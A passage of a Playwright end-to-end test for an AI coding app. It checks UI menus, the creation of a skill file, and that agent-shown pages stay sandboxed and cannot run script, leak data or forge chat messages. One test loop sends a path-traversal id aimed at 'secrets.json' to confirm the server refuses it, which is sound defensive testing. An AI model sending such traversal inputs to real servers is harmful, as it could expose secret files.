	assert.match(await page.locator('.sc-menu.open .sc-item.checked').textContent(), /project/);
	await page.keyboard.press('Escape');

	// Tooltips are ours, not the browser's: hovering moves the title into a styled bubble.
	await page.hover('[data-view=skills]');
	await page.locator('.sc-tip.open').waitFor();
	assert.match(await page.locator('.sc-tip.open').textContent(), /^Skills/);
	assert.equal(await page.locator('.sc-tip.open').getAttribute('data-side'), 'right', 'rail tips sit beside the rail');
	assert.equal(await page.getAttribute('[data-view=skills]', 'title'), null);

	// Right-clicking a message offers Copy message; the hover button is there too.
	await chat.locator('.message .body').first().click({ button: 'right' });
	await chat.locator('.sc-menu.open').waitFor();
	assert.ok((await chat.locator('.sc-menu.open').textContent()).includes('Copy message'));
	await page.keyboard.press('Escape');

	// 5. Creating a skill walks three prompts, writes the file, opens it in the built-in editor,
	//    and the skill then shows up in Settings.
	await page.keyboard.press('Control+k');
	await page.fill('#paletteInput', 'new skill');
	await page.keyboard.press('Enter');
	await page.locator('#palette:not(.hidden)').waitFor();
	await page.fill('#paletteInput', 'api-reviewer');
	await page.keyboard.press('Enter');
	await page.waitForFunction(() => document.getElementById('paletteTitle').textContent.includes('2/3'));
	await page.keyboard.press('Enter');
	await page.waitForFunction(() => document.getElementById('paletteTitle').textContent.includes('3/3'));
	await page.fill('#paletteInput', 'Reviews API changes');
	await page.keyboard.press('Enter');
	await page.locator('#editor:not(.hidden)').waitFor();
	assert.match(await page.inputValue('#editorText'), /Reviews API changes/);
	assert.ok(fs.existsSync(path.join(project, '.stormcoder/skills/api-reviewer.md')));
	await page.keyboard.press('Escape');
	await page.click('[data-view=skills]');
	await settings.locator('.area.active[data-area=skills]').getByText('Api Reviewer').first().waitFor({ timeout: 10000 });

	// Visual replies: the agent shows a page. Its markup, style and SVG render; its script does
	// not run, and nothing in it reaches the network, the top window or the chat around it.
	await page.click('[data-view=chat]');
	await chat.locator('.tab-add').click();
	await chat.locator('.chat-tab.active', { hasText: 'New chat' }).waitFor();
	await chat.locator('.seg-btn[data-value=agent]').click();
	await chat.locator('#input').fill('show a chart of sales');
	await chat.locator('#input').press('Enter');
	const shown = chat.locator('#messages > .message.page');
	await shown.waitFor({ timeout: 20000 });
	assert.equal((await shown.locator('.page-title').innerText()).trim(), 'Sales by month');
	assert.equal(await shown.locator('iframe.page-frame').getAttribute('sandbox'), '', 'the frame grants the page nothing');
	const inner = chat.frameLocator('iframe.page-frame');
	await inner.locator('#chart rect').waitFor({ timeout: 10000 });
	await new Promise(r => setTimeout(r, 500));
	assert.equal((await inner.locator('#t').innerText()).trim(), 'chart ready', 'the page\'s script did not run');
	await chat.getByText('Here is the chart.').first().waitFor({ timeout: 20000 });
	await new Promise(r => setTimeout(r, 500));
	assert.equal(await chat.getByText('FORGED').count(), 0, 'a page cannot speak as the host');
	assert.ok(!seen.some(r => r.model === 'LEAK'), 'a page cannot send anything out');
	assert.deepEqual(mock.gets.filter(u => u.includes('leak')), [], 'and loads nothing: no image, stylesheet or CSS url()');
	assert.equal(new URL(page.url()).origin, new URL(url).origin, 'and cannot move the window');
	const pageRequest = seen.find(r => r.tools?.some(t => t.function?.name === 'show_page'));
	assert.ok(pageRequest, 'show_page is offered to the agent');
	// The page is part of the transcript: it is there again after a reload.
	await page.reload();
	await page.frameLocator('#view-chat').locator('#messages > .message.page iframe.page-frame').waitFor({ timeout: 15000 });
	// An unknown or malformed page id serves nothing of the app's.
	for (const bad of ['0000000000000000', 'view', '..%2F..%2Fsecrets.json']) {
		const res = await fetch(`${new URL(url).origin}/page/${bad}`);
		assert.equal(res.status, 404, `page/${bad}`);
		assert.match(res.headers.get('content-security-policy') ?? '', /^sandbox; default-src 'none'/);
	}

	assert.deepEqual(errors, [], 'no uncaught page errors');
	console.log('e2e: ok');
} catch (err) {
	failed = true;
	console.error('e2e: FAILED\n', err);
	try { await (await browser.contexts()[0].pages())[0].screenshot({ path: path.join(os.tmpdir(), 'e2e-fail.png') }); console.error('screenshot: ' + path.join(os.tmpdir(), 'e2e-fail.png')); } catch { /* best effort */ }
	console.error('requests seen by mock:', JSON.stringify(seen).slice(0, 800));
	console.error(host.log());
} finally {
	await browser.close();
	host.stop();
	mock.close();
}
process.exit(failed ? 1 : 0);
